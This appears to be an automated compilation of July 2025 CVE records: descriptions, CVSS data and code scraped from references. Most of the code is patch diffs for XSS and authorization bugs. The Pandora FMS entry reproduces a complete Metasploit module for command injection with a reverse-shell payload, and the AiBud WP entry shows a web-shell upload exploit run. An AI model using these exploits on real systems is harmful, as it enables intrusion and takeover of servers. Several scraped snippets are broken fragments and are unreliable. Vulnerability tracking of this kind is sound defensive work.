Published: 2025-07-03T20:15:23.737
Modified: 2025-07-08T16:19:11.700
CVSS Score: 8.6 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
Short Description is a MediaWiki extension that provides local short description support. In version 4.0.0, short descriptions are not properly sanitized before being inserted as HTML using mw.util.addSubtitle, allowing any user to insert arbitrary HTML into the DOM by editing a page. This issue has been patched in version 4.0.1.

References (2):
  1. https://github.com/StarCitizenTools/mediawiki-extensions-ShortDescription/commit/bc4fdbaeb1dff127fb6d08c0d385b64aa128c8f8
  2. https://github.com/StarCitizenTools/mediawiki-extensions-ShortDescription/security/advisories/GHSA-p85q-mww9-gwqf

Attempting to extract code examples from references...

--- Code from https://github.com/StarCitizenTools/mediawiki-extensions-ShortDescription/commit/bc4fdbaeb1dff127fb6d08c0d385b64aa128c8f8 ---
From bc4fdbaeb1dff127fb6d08c0d385b64aa128c8f8 Mon Sep 17 00:00:00 2001
From: SomeRandomDeveloper <thisisnotmyname275@gmail.com>
Date: Thu, 3 Jul 2025 13:30:48 -0400
Subject: [PATCH] fix(SECURITY): escape short description in the subtitle

`mw.util.addSubtitle()` takes raw HTML,
and the description is not sanitized up to this point.
This fixes a stored XSS vulnerability through wikitext.

CVE-2025-53369
---
 modules/ext.shortDescription.js | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/modules/ext.shortDescription.js b/modules/ext.shortDescription.js
index cf00c86..3a91e85 100644
--- a/modules/ext.shortDescription.js
+++ b/modules/ext.shortDescription.js
@@ -5,7 +5,7 @@ function main() {
 		return;
 	}
 
-	mw.util.addSubtitle( shortdesc );
+	mw.util.addSubtitle( mw.html.escape( shortdesc ) );
 }
 
 main();


================================================================================


CVE ID: CVE-2025-53368
Published: 2025-07-03T20:15:23.577
Modified: 2025-08-22T14:20:41.683
CVSS Score: 8.6 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
Citizen is a MediaWiki skin that makes extensions part of the cohesive experience. From versions 1.9.4 to before 3.4.0, page descriptions are inserted into raw HTML without proper sanitization by the Citizen skin when using the old search bar. Any user with page editing privileges can insert cross-site scripting (XSS) payloads into the DOM for other users who are searching for specific pages. This issue has been patched in version 3.4.0.

References (3):
  1. https://github.com/StarCitizenTools/mediawiki-skins-Citizen/commit/aedbceb3380bb48db6b59e272fc187529c71c8ca [Patch]
  2. https://github.com/StarCitizenTools/mediawiki-skins-Citizen/releases/tag/v3.4.0 [Release Notes]
  3. https://github.com/StarCitizenTools/mediawiki-skins-Citizen/security/advisories/GHSA-rq6g-6g94-jfr4 [Exploit, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/StarCitizenTools/mediawiki-skins-Citizen/commit/aedbceb3380bb48db6b59e272fc187529c71c8ca ---
From aedbceb3380bb48db6b59e272fc187529c71c8ca Mon Sep 17 00:00:00 2001
From: SomeRandomDeveloper <thisisnotmyname275@gmail.com>
Date: Thu, 3 Jul 2025 12:45:30 -0400
Subject: [PATCH] =?UTF-8?q?fix(SECURITY):=20=F0=9F=90=9B=20=F0=9F=94=92?=
 =?UTF-8?q?=EF=B8=8F=20sanitize=20search=20result=20descriptions=20in=20ol?=
 =?UTF-8?q?d=20search=20module?=
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

The descriptions from TextExtracts, Description2, Wikibase, and ShortDescription
can contain unsanitized user input. This fixes a stored XSS vulnerability.

CVE-2025-53368
---
 .../skins.citizen.search/templates/TypeaheadListItem.mustache   | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/resources/skins.citizen.search/templates/TypeaheadListItem.mustache b/resources/skins.citizen.search/templates/TypeaheadListItem.mustache
index f37f9b2e9..537beb806 100644
--- a/resources/skins.citizen.search/templates/TypeaheadListItem.mustache
+++ b/resources/skins.citizen.search/templates/TypeaheadListItem.mustache
@@ -15,7 +15,7 @@
 		<div class="citizen-typeahead-list-item-text">
 			{{#text}}{{.}}{{/text}}
 			{{#title}}<div class="citizen-typeahead-list-item-title">{{{.}}}</div>{{/title}}
-			{{#description}}<div class="citizen-typeahead-list-item-description">{{{.}}}</div>{{/description}}
+			{{#description}}<div class="citizen-typeahead-list-item-description">{{.}}</div>{{/description}}
 		</div>
 		{{#html-end}}<div class="citizen-typeahead-list-item-end">{{{.}}}</div>{{/html-end}}
 	</a>


================================================================================


CVE ID: CVE-2025-52554
Published: 2025-07-03T20:15:23.423
Modified: 2025-09-04T16:53:45.247
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-862: Missing Authorization

Description:
n8n is a workflow automation platform. Prior to version 1.99.1, an authorization vulnerability was discovered in the /rest/executions/:id/stop endpoint of n8n. An authenticated user can stop workflow executions that they do not own or that have not been shared with them, leading to potential business disruption. This issue has been patched in version 1.99.1. A workaround involves restricting access to the /rest/executions/:id/stop endpoint via reverse proxy or API gateway.

References (4):
  1. https://github.com/dudanogueira/n8n/commit/ca2f90c7fbaa1d661ade2f45d587d9469bc287e1 [Patch]
  2. https://github.com/n8n-io/n8n/commit/e5edc60e344924230baafb11fa1f0af788e9ca9a [Patch]
  3. https://github.com/n8n-io/n8n/pull/16405 [Patch, Issue Tracking]
  4. https://github.com/n8n-io/n8n/security/advisories/GHSA-gq57-v332-7666 [Patch, Third Party Advisory, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://github.com/dudanogueira/n8n/commit/ca2f90c7fbaa1d661ade2f45d587d9469bc287e1 ---
From ca2f90c7fbaa1d661ade2f45d587d9469bc287e1 Mon Sep 17 00:00:00 2001
From: Marc Littlemore <MarcL@users.noreply.github.com>
Date: Wed, 18 Jun 2025 08:27:43 +0100
Subject: [PATCH] fix(core): Prevent unauthorised workflow termination (#16405)

---
 .../__tests__/execution.service.test.ts       | 52 ++++++++++++-------
 .../__tests__/executions.controller.test.ts   | 10 ++--
 .../cli/src/executions/execution.service.ts   | 18 ++++---
 .../src/executions/executions.controller.ts   |  4 +-
 .../integration/executions.controller.test.ts | 29 ++++++++++-
 5 files changed, 81 insertions(+), 32 deletions(-)

diff --git a/packages/cli/src/executions/__tests__/execution.service.test.ts b/packages/cli/src/executions/__tests__/execution.service.test.ts
index 7122e6cb180dd..e4cedaa2b2038 100644
--- a/packages/cli/src/executions/__tests__/execution.service.test.ts
+++ b/packages/cli/src/executions/__tests__/execution.service.test.ts
@@ -70,12 +70,13 @@ describe('ExecutionService', () => {
 			/**
 			 * Arrange
 			 */
-			executionRepository.findSingleExecution.mockResolvedValue(undefined);
+			executionRepository.findWithUnflattenedData.mockResolvedValue(undefined);
+			const req = mock<ExecutionRequest.Stop>({ params: { id: '1234' } });
 
 			/**
 			 * Act
 			 */
-			const stop = executionService.stop('inexistent-123');
+			const stop = executionService.stop(req.params.id, []);
 
 			/**
 			 * Assert
@@ -88,12 +89,13 @@ describe('ExecutionService', () => {
 			 * Arrange
 			 */
 			const execution = mock<IExecutionResponse>({ id: '123', status: 'success' });
-			executionRepository.findSingleExecution.mockResolvedValue(execution);
+			executionRepository.findWithUnflattenedData.mockResolvedValue(execution);
+			const req = mock<ExecutionRequest.Stop>({ params: { id: execution.id } });
 
 			/**
 			 * Act
 			 */
-			const stop = executionService.stop(execution.id);
+			const stop = executionService.stop(req.params.id, [execution.id]);
 
 			/**
 			 * Assert
@@ -107,16 +109,18 @@ describe('ExecutionService', () => {
 				 * Arrange
 				 */
 				const execution = mock<IExecutionResponse>({ id: '123', status: 'running' });
-				executionRepository.findSingleExecution.mockResolvedValue(execution);
+				executionRepository.findWithUnflattenedData.mockResolvedValue(execution);
 				concurrencyControl.has.mockReturnValue(false);
 				activeExecutions.has.mockReturnValue(true);
 				waitTracker.has.mockReturnValue(false);
 				executionRepository.stopDuringRun.mockResolvedValue(mock<IExecutionResponse>());
 
+				const req = mock<ExecutionRequest.Stop>({ params: { id: execution.id } });
+
 				/**
 				 * Act
 				 */
-				await executionService.stop(execution.id);
+				await executionService.stop(req.params.id, [execution.id]);
 
 				/**
 				 * Assert
@@ -132,16 +136,18 @@ describe('ExecutionService', () => {
 				 * Arrange
 				 */
 				const execution = mock<IExecutionResponse>({ id: '123', status: 'waiting' });
-				executionRepository.findSingleExecution.mockResolvedValue(execution);
+				executionRepository.findWithUnflattenedData.mockResolvedValue(execution);
 				concurrencyControl.has.mockReturnValue(false);
 				activeExecutions.has.mockReturnValue(true);
 				waitTracker.has.mockReturnValue(true);
 				executionRepository.stopDuringRun.mockResolvedValue(mock<IExecutionResponse>());
 
+				const req = mock<ExecutionRequest.Stop>({ params: { id: execution.id } });
+
 				/**
 				 * Act
 				 */
-				await executionService.stop(execution.id);
+				await executionService.stop(req.params.id, [execution.id]);
 
 				/**
 				 * Assert
@@ -157,16 +163,18 @@ describe('ExecutionService', () => {
 				 * Arrange
 				 */
 				const execution = mock<IExecutionResponse>({ id: '123', status: 'new', mode: 'trigger' });
-				executionRepository.findSingleExecution.mockResolvedValue(execution);
+				executionRepository.findWithUnflattenedData.mockResolvedValue(execution);
 				concurrencyControl.has.mockReturnValue(true);
 				activeExecutions.has.mockReturnValue(false);
 				waitTracker.has.mockReturnValue(false);
 				executionRepository.stopBeforeRun.mockResolvedValue(mock<IExecutionResponse>());
 
+				const req = mock<ExecutionRequest.Stop>({ params: { id: execution.id } });
+
 				/**
 				 * Act
 				 */
-				await executionService.stop(execution.id);
+				await executionService.stop(req.params.id, [execution.id]);
 
 				/**
 				 * Assert
@@ -193,11 +201,13 @@ describe('ExecutionService', () => {
 						mode: 'manual',
 						status: 'running',
 					});
-					executionRepository.findSingleExecution.mockResolvedValue(execution);
+					executionRepository.findWithUnflattenedData.mockResolvedValue(execution);
 					concurrencyControl.has.mockReturnValue(false);
 					activeExecutions.has.mockReturnValue(true);
 					waitTracker.has.mockReturnValue(false);
-					const job = mock<Job>({ data: { executionId: '123' } });
+
+					const req = mock<ExecutionRequest.Stop>({ params: { id: execution.id } });
+					const job = mock<Job>({ data: { executionId: execution.id } });
 					scalingService.findJobsByStatus.mockResolvedValue([job]);
 					executionRepository.stopDuringRun.mockResolvedValue(mock<IExecutionResponse>());
 					// @ts-expect-error Private method
@@ -206,7 +216,7 @@ describe('ExecutionService', () => {
 					/**
 					 * Act
 					 */
-					await executionService.stop(execution.id);
+					await executionService.stop(req.params.id, [execution.id]);
 
 					/**
 					 * Assert
@@ -228,16 +238,18 @@ describe('ExecutionService', () => {
 					 */
 					config.set('executions.mode', 'queue');
 					const execution = mock<IExecutionResponse>({ id: '123', status: 'running' });
-					executionRepository.findSingleExecution.mockResolvedValue(execution);
+					executionRepository.findWithUnflattenedData.mockResolvedValue(execution);
 					waitTracker.has.mockReturnValue(false);
-					const job = mock<Job>({ data: { executionId: '123' } });
+
+					const req = mock<ExecutionRequest.Stop>({ params: { id: execution.id } });
+					const job = mock<Job>({ data: { executionId: execution.id } });
 					scalingService.findJobsByStatus.mockResolvedValue([job]);
 					executionRepository.stopDuringRun.mockResolvedValue(mock<IExecutionResponse>());
 
 					/**
 					 * Act
 					 */
-					await executionService.stop(execution.id);
+					await executionService.stop(req.params.id, [execution.id]);
 
 					/**
 					 * Assert
@@ -255,16 +267,18 @@ describe('ExecutionService', () => {
 					 */
 					config.set('executions.mode', 'queue');
 					const execution = mock<IExecutionResponse>({ id: '123', status: 'waiting' });
-					executionRepository.findSingleExecution.mockResolvedValue(execution);
+					executionRepository.findWithUnflattenedData.mockResolvedValue(execution);
 					waitTracker.has.mockReturnValue(true);
-					const job = mock<Job>({ data: { executionId: '123' } });
+
+					const req = mock<ExecutionRequest.Stop>({ params: { id: execution.id } });
+					const job = mock<Job>({ data: { executionId: execution.id } });
 					scalingService.findJobsByStatus.mockResolvedValue([job]);
 					executionRepository.stopDuringRun.mockResolvedValue(mock<IExecutionResponse>());
 
 					/**
 					 * Act
 					 */
-					await executionService.stop(execution.id);
+					await executionService.stop(req.params.id, [execution.id]);
 
 					/**
 					 * Assert
diff --git a/packages/cli/src/executions/__tests__/executions.controller.test.ts b/packages/cli/src/executions/__tests__/executions.controller.test.ts
index d5f8f849a342f..bd8fd5f42060b 100644
--- a/packages/cli/src/executions/__tests__/executions.controller.test.ts
+++ b/packages/cli/src/executions/__tests__/executions.controller.test.ts
@@ -138,7 +138,7 @@ describe('ExecutionsController', () => {
 		const executionId = '999';
 		const req = mock<ExecutionRequest.Stop>({ params: { id: executionId } });
 
-		it('should 404 when execution is inaccessible for user', async () => {
+		it('should throw expected NotFoundError when all workflows are inaccessible for user', async () => {
 			workflowSharingService.getSharedWorkflowIds.mockResolvedValue([]);
 
 			const promise = executionsController.stop(req);
@@ -147,12 +147,12 @@ describe('ExecutionsController', () => {
 			expect(executionService.stop).not.toHaveBeenCalled();
 		});
 
-		it('should call ask for an execution to be stopped', async () => {
-			workflowSharingService.getSharedWorkflowIds.mockResolvedValue(['123']);
+		it('should call execution service with expected data when user has accessible workflows', async () => {
+			const mockAccessibleWorkflowIds = ['1234', '999'];
+			workflowSharingService.getSharedWorkflowIds.mockResolvedValue(mockAccessibleWorkflowIds);
 
 			await executionsController.stop(req);
-
-			expect(executionService.stop).toHaveBeenCalledWith(executionId);
+			expect(executionService.stop).toHaveBeenCalledWith(req.params.id, mockAccessibleWorkflowIds);
 		});
 	});
 });
diff --git a/packages/cli/src/executions/execution.service.ts b/packages/cli/src/executions/execution.service.ts
index 889882aa576fd..b07fe70e89a56 100644
--- a/packages/cli/src/executions/execution.service.ts
+++ b/packages/cli/src/executions/execution.service.ts
@@ -420,13 +420,19 @@ export class ExecutionService {
 		);
 	}
 
-	async stop(executionId: string): Promise<StopResult> {
-		const execution = await this.executionRepository.findSingleExecution(executionId, {
-			includeData: true,
-			unflattenData: true,
-		});
+	async stop(executionId: string, sharedWorkflowIds: string[]): Promise<StopResult> {
+		const execution = await this.executionRepository.findWithUnflattenedData(
+			executionId,
+			sharedWorkflowIds,
+		);
 
-		if (!execution) throw new MissingExecutionStopError(executionId);
+		if (!execution) {
+			this.logger.info(`Unable to stop execution "${executionId}" as it was not found`, {
+				executionId,
+			});
+
+			throw new MissingExecutionStopError(executionId);
+		}
 
 		this.assertStoppable(execution);
 
diff --git a/packages/cli/src/executions/executions.controller.ts b/packages/cli/src/executions/executions.controller.ts
index ec68a05df62a0..7bc336cd2ee90 100644
--- a/packages/cli/src/executions/executions.controller.ts
+++ b/packages/cli/src/executions/executions.controller.ts
@@ -96,7 +96,9 @@ export class ExecutionsController {
 
 		if (workflowIds.length === 0) throw new NotFoundError('Execution not found');
 
-		return await this.executionService.stop(req.params.id);
+		const executionId = req.params.id;
+
+		return await this.executionService.stop(executionId, workflowIds);
 	}
 
 	@Post('/:id/retry')
diff --git a/packages/cli/test/integration/executions.controller.test.ts b/packages/cli/test/integration/executions.controller.test.ts
index 0652006b8bae0..2a75757a6f87f 100644
--- a/packages/cli/test/integration/executions.controller.test.ts
+++ b/packages/cli/test/integration/executions.controller.test.ts
@@ -3,7 +3,11 @@ import type { User } from '@n8n/db';
 import { ConcurrencyControlService } from '@/concurrency/concurrency-control.service';
 import { WaitTracker } from '@/wait-tracker';
 
-import { createSuccessfulExecution, getAllExecutions } from './shared/db/executions';
+import {
+	createSuccessfulExecution,
+	createWaitingExecution,
+	getAllExecutions,
+} from './shared/db/executions';
 import { createTeamProject, linkUserToProject } from './shared/db/projects';
 import { createMember, createOwner } from './shared/db/users';
 import { createWorkflow, shareWorkflowWithUsers } from './shared/db/workflows';
@@ -27,6 +31,11 @@ const saveExecution = async ({ belongingTo }: { belongingTo: User }) => {
 	return await createSuccessfulExecution(workflow);
 };
 
+const saveWaitingExecution = async ({ belongingTo }: { belongingTo: User }) => {
+	const workflow = await createWorkflow({}, belongingTo);
+	return await createWaitingExecution(workflow);
+};
+
 beforeEach(async () => {
 	await testDb.truncate(['ExecutionEntity', 'WorkflowEntity', 'SharedWorkflow']);
 	testServer.license.reset();
@@ -117,3 +126,21 @@ describe('POST /executions/delete', () => {
 		expect(executions).toHaveLength(0);
 	});
 });
+
+describe('POST /executions/stop', () => {
+	test('should not stop an execution we do not have access to', async () => {
+		await saveExecution({ belongingTo: owner });
+		const incorrectExecutionId = '1234';
+
+		await testServer
+			.authAgentFor(owner)
+			.post(`/executions/${incorrectExecutionId}/stop`)
+			.expect(500);
+	});
+
+	test('should stop an execution we have access to', async () => {
+		const execution = await saveWaitingExecution({ belongingTo: owner });
+
+		await testServer.authAgentFor(owner).post(`/executions/${execution.id}/stop`).expect(200);
+	});
+});


================================================================================


CVE ID: CVE-2025-34088
Published: 2025-07-03T20:15:23.007
Modified: 2025-09-16T19:44:41.263
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
An authenticated remote code execution vulnerability exists in Pandora FMS version 7.0NG and earlier. The net_tools.php functionality allows authenticated users to execute arbitrary OS commands via the select_ips parameter when performing network tools operations, such as pinging. This occurs because user input is not properly sanitized before being passed to system commands, enabling command injection.

References (5):
  1. https://github.com/pandorafms/pandorafms [Product]
  2. https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/linux/http/pandora_ping_cmd_exec.rb [Exploit]
  3. https://vulncheck.com/advisories/pandora-fms-rce-via-ping [Third Party Advisory]
  4. https://www.exploit-db.com/exploits/48334 [Exploit, VDB Entry]
  5. https://www.rapid7.com/db/modules/exploit/linux/http/pandora_ping_cmd_exec/ [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://www.exploit-db.com/exploits/48334 ---
<code class="language-rb" style="white-space: pre-wrap;">##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            =&gt; &#039;Pandora FMS Ping Authenticated Remote Code Execution&#039;,
      &#039;Description&#039;     =&gt; %q{
        This module exploits a vulnerability found in Pandora FMS 7.0NG and lower.
        net_tools.php in Pandora FMS 7.0NG allows remote attackers to execute arbitrary OS commands.
      },
      &#039;Author&#039;          =&gt;
        [
          &#039;Onur ER &lt;onur@onurer.net&gt;&#039; # Vulnerability discovery and Metasploit module
        ],
      &#039;DisclosureDate&#039;  =&gt; &#039;2020-03-09&#039;,
      &#039;License&#039;         =&gt; MSF_LICENSE,
      &#039;Platform&#039;        =&gt; &#039;linux&#039;,
      &#039;Arch&#039;            =&gt; [ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;      =&gt; false,
      &#039;Targets&#039;         =&gt;
        [
          [&#039;Automatic Target&#039;, {}]
        ],
      &#039;DefaultOptions&#039;  =&gt;
        {
          &#039;Payload&#039; =&gt; &#039;linux/x86/meterpreter/reverse_tcp&#039;
        },
      &#039;DefaultTarget&#039;   =&gt; 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vulnerable Pandora FMS instance&#039;, &#039;/pandora_console/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to authenticate with&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to authenticate with&#039;])
      ]
    )
  end

  def check
    res = send_request_cgi({
      &#039;method&#039;  =&gt; &#039;GET&#039;,
      &#039;uri&#039;     =&gt; normalize_uri(target_uri, &#039;index.php&#039;)
    })

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    unless res.body =~ /Pandora/i
      return CheckCode::Safe
    end

    pandora_version = res.body.scan(/&lt;div id=&quot;ver_num&quot;&gt;v(.*?)&lt;\/div&gt;/).flatten.first
    version = Gem::Version.new(pandora_version)

    print_status(&quot;Pandora FMS version #{version}&quot;) if version

    if Gem::Version.new(version) &lt;= Gem::Version.new(&#039;7.0NG&#039;)
      return Exploit::CheckCode::Appears
    end

    CheckCode::Detected
  end

  def authenticate
    res = send_request_cgi({
      &#039;method&#039;    =&gt; &#039;POST&#039;,
      &#039;uri&#039;       =&gt; normalize_uri(target_uri, &#039;index.php&#039;),
      &#039;vars_get&#039;  =&gt; {
        &#039;login&#039;   =&gt; &#039;1&#039;
      },
      &#039;vars_post&#039; =&gt; {
        &#039;nick&#039;          =&gt; datastore[&#039;USERNAME&#039;],
        &#039;pass&#039;          =&gt; datastore[&#039;PASSWORD&#039;],
        &#039;login_button&#039;  =&gt; &#039;Login&#039;
      }
    })

    return auth_succeeded?(res)
  end

  def auth_succeeded?(res)
    unless res &amp;&amp; res.code == 200 &amp;&amp; res.body.include?(&#039;Welcome to Pandora FMS&#039;)
      print_error(&#039;Authentication failed!&#039;)
      return false
    end
    print_good(&#039;Successfully authenticated&#039;)
    print_status(&#039;Attempting to retrieve session cookie&#039;)
    @cookie = res.get_cookies
    unless @cookie.include?(&#039;PHPSESSID&#039;)
      print_error(&#039;Error retrieving cookie!&#039;)
      return false
    end
    print_good(&quot;Successfully retrieved session cookie: #{@cookie}&quot;)
    true
  end

  def exploit
    print_status(&#039;Exploiting...&#039;)
    execute_cmdstager(flavor: :wget, nospace: true)
  end

  def execute_command(cmd, opts = {})
    print_status(&quot;Attempting to authenticate using (#{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]})&quot;)
    auth = authenticate
    unless auth
      fail_with Failure::NoAccess, &#039;Please provide a valid username and password.&#039;
    end

    id_agente = 1
    while !session_created? &amp;&amp; id_agente &lt;= 10
      send_request_cgi({
        &#039;method&#039;    =&gt; &#039;POST&#039;,
        &#039;uri&#039;       =&gt; normalize_uri(target_uri, &#039;index.php&#039;),
        &#039;cookie&#039;    =&gt; @cookie,
        &#039;vars_get&#039;  =&gt; {
          &#039;sec&#039;           =&gt; &#039;estado&#039;,
          &#039;sec2&#039;          =&gt; &#039;operation/agentes/ver_agente&#039;,
          &#039;tab&#039;           =&gt; &#039;extension&#039;,
          &#039;id_agente&#039;     =&gt; &quot;#{id_agente}&quot;,
          &#039;id_extension&#039;  =&gt; &#039;network_tools&#039;
        },
        &#039;vars_post&#039; =&gt; {
          &#039;operation&#039;     =&gt; &#039;2&#039;,
          &#039;select_ips&#039;    =&gt; &quot;;#{cmd}&quot;,
          &#039;community&#039;     =&gt; &#039;public&#039;,
          &#039;submit&#039;        =&gt; &#039;Execute&#039;
        }
      })

      id_agente += 1
    end
  end
end
            

================================================================================


CVE ID: CVE-2025-34087
Published: 2025-07-03T20:15:22.843
Modified: 2025-10-01T14:08:35.893
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
An authenticated command injection vulnerability exists in Pi-hole versions up to 3.3. When adding a domain to the allowlist via the web interface, the domain parameter is not properly sanitized, allowing an attacker to append OS commands to the domain string. These commands are executed on the underlying operating system with the privileges of the Pi-hole service user.




This behavior was present in the legacy AdminLTE interface and has since been patched in later versions.

References (5):
  1. https://github.com/pi-hole/web/releases/tag/v4.0 [Release Notes]
  2. https://pi-hole.net/ [Product]
  3. https://pulsesecurity.co.nz/advisories/pihole-v3.3-vulns [Exploit, Third Party Advisory]
  4. https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/unix/http/pihole_whitelist_exec.rb [Exploit]
  5. https://vulncheck.com/advisories/pihole-adminlte-whitelist-rce [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/pi-hole/web/releases/tag/v4.0 ---
(integrated)

getClientNames

================================================================================


CVE ID: CVE-2025-34086
Published: 2025-07-03T20:15:22.683
Modified: 2025-09-16T19:51:00.940
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-434: Unrestricted Upload of File with Dangerous Type
  - CWE-94: Improper Control of Generation of Code ('Code Injection')

Description:
Bolt CMS versions 3.7.0 and earlier contain a chain of vulnerabilities that together allow an authenticated user to achieve remote code execution. A user with valid credentials can inject arbitrary PHP code into the displayname field of the user profile, which is rendered unsanitized in backend templates. The attacker can then list and rename cached session files via the /async/browse/cache/.sessions and /async/folder/rename endpoints. By renaming a .session file to a path under the publicly accessible /files/ directory with a .php extension, the attacker can turn the injected code into an executable web shell. Finally, the attacker triggers the payload via a crafted HTTP GET request to the rogue file.

NOTE: The vendor announced that Bolt 3 reached end-of-life after 31 December 2021.

References (6):
  1. https://boltcms.io/newsitem/major-announcements-bolt-3-eol-bolt-4-2-5-0-releases [Release Notes]
  2. https://github.com/bolt/bolt [Product]
  3. https://github.com/bolt/bolt/releases/tag/3.7.1 [Release Notes]
  4. https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/unix/webapp/bolt_authenticated_rce.rb [Exploit]
  5. https://www.exploit-db.com/exploits/48296 [Exploit, VDB Entry]
  6. https://www.rapid7.com/db/modules/exploit/unix/webapp/bolt_authenticated_rce/ [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/bolt/bolt/releases/tag/3.7.1 ---
curl -O https://bolt.cm/distribution/archive/3.7/bolt-3.7.1.tar.gz
tar -xzf bolt-3.7.1.tar.gz --strip-components=1
php app/nut init


ContextErrorException

null

================================================================================


CVE ID: CVE-2025-23968
Published: 2025-07-03T19:15:23.043
Modified: 2025-07-08T16:19:11.700
CVSS Score: 9.1 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
Unrestricted Upload of File with Dangerous Type vulnerability in WPCenter AiBud WP allows Upload a Web Shell to a Web Server.This issue affects AiBud WP: from n/a through 1.8.5.

References (3):
  1. https://github.com/d0n601/CVE-2025-23968
  2. https://patchstack.com/database/wordpress/plugin/aibuddy-openai-chatgpt/vulnerability/wordpress-aibud-wp-plugin-1-8-5-arbitrary-file-upload-vulnerability?_s_id=cve
  3. https://ryankozak.com/posts/cve-2025-23968/

Attempting to extract code examples from references...

--- Code from https://github.com/d0n601/CVE-2025-23968 ---
/wp-json/ai-buddy/v1/wp/attachments

shell.php

python cve-2025-23968.py https://lab 1 .hacker admin PASSWORD
Logging into: https://lab 1 .hacker/wp-admin
Extracting nonce values...
Uploading web shell: shell.php
Executing test command: ip addr

&lt;pre&gt; 1 : lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN
group default qlen 1000
    link/loopback 00 : 00 : 00 : 00 : 00 : 00 brd 00 : 00 : 00 : 00 : 00 : 00
    inet 127. 0. 0. 1 / 8 scope host lo
        valid_lft forever preferred_lft forever
    inet 6 :: 1 / 128 scope host
        valid_lft forever preferred_lft forever
2 : eth 0 : &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP
group default qlen 1000
    link/ether 08 : 00 : 27 : 5 b: 34 : 2 f brd ff:ff:ff:ff:ff:ff
altname enp 0 s 3
    inet 10. 0. 2. 15 / 24 metric 100 brd 10. 0. 2. 255 scope global dynamic eth 0
        valid_lft 75700 sec preferred_lft 75700 sec
    inet 6 fd 17 : 625 c:f 037 : 2 :a 00 : 27 ff:fe 5 b: 342 f/ 64 scope global dynamic
mngtmpaddr noprefixroute
        valid_lft 86174 sec preferred_lft 14174 sec
    inet 6 fe 80 ::a 00 : 27 ff:fe 5 b: 342 f/ 64 scope link
        valid_lft forever preferred_lft forever
3 : eth 1 : &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP
group default qlen 1000
    link/ether 08 : 00 : 27 : 39 :ea:eb brd ff:ff:ff:ff:ff:ff
altname enp 0 s 8
    inet 192. 168. 56. 56 / 24 brd 192. 168. 56. 255 scope global eth 1
        valid_lft forever preferred_lft forever
    inet 6 fe 80 ::a 00 : 27 ff:fe 39 :eaeb/ 64 scope link
        valid_lft forever preferred_lft forever
4 : docker 0 : &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue
state DOWN group default
    link/ether 02 : 42 : 6 f: 4 c: 3 e:ed brd ff:ff:ff:ff:ff:ff
    inet 172. 17. 0. 1 / 16 brd 172. 17. 255. 255 scope global docker 0
        valid_lft forever preferred_lft forever
&lt;/pre&gt;


================================================================================


CVE ID: CVE-2025-48939
Published: 2025-07-03T17:15:39.300
Modified: 2025-07-08T16:19:11.700
CVSS Score: 4.2 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:C/C:N/I:L/A:L

CWE Categories:
  - CWE-138: CWE-138

Description:
